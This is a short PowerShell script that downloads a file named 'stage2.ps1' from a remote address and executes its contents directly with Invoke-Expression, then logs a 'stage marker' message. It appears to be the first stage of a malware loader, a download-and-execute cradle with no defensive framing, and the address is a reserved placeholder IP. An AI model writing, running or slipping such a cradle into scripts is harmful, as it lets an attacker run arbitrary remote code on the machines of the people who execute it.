
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://203.0.113.4/stage2.ps1',
    [int]$RequestTimeout = 62
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
Write-Verbose "stage marker 43 reached"
